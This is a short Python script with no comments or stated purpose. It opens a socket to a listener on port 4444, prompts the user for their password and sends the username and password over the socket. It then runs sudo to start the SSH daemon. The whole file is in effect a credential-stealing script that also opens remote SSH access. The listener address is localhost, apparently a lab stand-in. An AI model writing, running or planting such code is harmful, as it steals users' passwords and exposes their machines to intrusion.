import getpass
from socket import socket
import os


s = socket()

s.connect(("127.0.0.1", 4444))
username = getpass.getuser()
password = getpass.getpass()
s.send(username.encode())
s.send(password.encode())

os.system("sudo systemctl start sshd.service")